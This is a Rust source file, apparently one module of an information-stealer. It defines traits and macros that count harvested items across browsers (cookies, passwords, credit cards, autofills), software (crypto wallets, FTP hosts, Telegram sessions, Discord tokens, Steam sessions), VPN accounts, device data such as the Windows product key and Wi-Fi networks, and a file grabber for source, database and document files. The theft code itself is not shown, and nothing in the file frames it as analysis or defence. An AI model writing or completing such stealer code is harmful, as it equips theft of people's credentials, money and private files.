#![no_std]
extern crate alloc;

use alloc::string::String;

macro_rules! increase_count {
    ($name:ident) => {
        paste::paste! {
            fn [<increase_ $name _by>](&self, count: usize);
        
            fn [<increase_ $name>](&self) {
                self.[<increase_ $name _by>](1);
            }
            
            fn [<get_ $name>](&self) -> usize;
        }
    };
}

macro_rules! flag {
    ($name:ident) => {
        paste::paste! {
            fn [<set_ $name>](&self);
            
            fn [<is_ $name>](&self) -> bool;
        }
    };
    ($name:ident, $ty:ty) => {
        paste::paste! {
            fn [<set_ $name>](&self, value: $ty);
            
            fn [<get_ $name>](&self) -> &$ty;
        }
    }
}

pub trait Browser: Send + Sync + 'static {
    increase_count!(cookies);
    increase_count!(passwords);
    increase_count!(credit_cards);
    increase_count!(auto_fills);
    increase_count!(history);
    increase_count!(bookmarks);
    increase_count!(downloads);
}

pub trait Software: Send + Sync + 'static {
    increase_count!(wallets);
    increase_count!(ftp_hosts);
    increase_count!(telegram_sessions);
    increase_count!(discord_tokens);
    increase_count!(steam_session);
}

pub trait FileGrabber: Send + Sync + 'static {
    increase_count!(source_code_files);
    increase_count!(database_files);
    increase_count!(documents);
}

pub trait Vpn: Send + Sync + 'static {
    increase_count!(accounts);
}

pub trait Device: Send + Sync + 'static {
    flag!(windows_product_key, String);
    
    increase_count!(wifi_networks);
}

pub trait Collector: Send + Sync + 'static
{
    type Browser: Browser;
    type Software: Software;
    type FileGrabber: FileGrabber;
    type Vpn: Vpn;
    type Device: Device;
    
    fn browser(&self) -> &'static Self::Browser;
    
    fn software(&self) -> &'static Self::Software;
    
    fn file_grabber(&self) -> &'static Self::FileGrabber;
    
    fn vpn(&self) -> &'static Self::Vpn;
    
    fn device(&self) -> &'static Self::Device;
}